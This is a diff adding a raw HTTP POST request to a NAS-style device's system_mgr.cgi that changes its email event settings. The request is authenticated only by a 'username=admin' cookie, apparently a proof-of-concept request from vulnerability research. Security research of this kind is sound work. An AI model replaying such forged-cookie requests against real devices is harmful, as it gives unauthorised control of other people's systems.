@@ -1,0 +1,15 @@
+POST /cgi-bin/system_mgr.cgi HTTP/1.1
+Host: 192.168.1.201
+Content-Length: 393
+Accept: */*
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Origin: http://192.168.1.201
+Referer: http://192.168.1.201/web/system_mgr/mail.html
+Accept-Encoding: gzip, deflate, br
+Cookie: username=admin
+Connection: keep-alive
+
+cmd=cgi_email_event&f_name_pwd=1&f_hd_space=1&f_hd_full=1&f_hd_crash=0&f_hd_degrad=0&f_hd_rebuilt=0&f_hd_temperature=0&f_firmware_update=0&f_log_schedule=0&f_log_full=0&f_hour=0&f_min=0&f_day=1&f_week=1&s_type=3&f_bt=0&f_config_update=0&f_smart_test=0&f_recover_power_fail=0&f_hd_rebuilting=0&f_hd_remove=0&f_hd_insert=0&space_f_hour=0&space_f_min=0&space_f_day=1&space_f_week=1&space_s_type=3
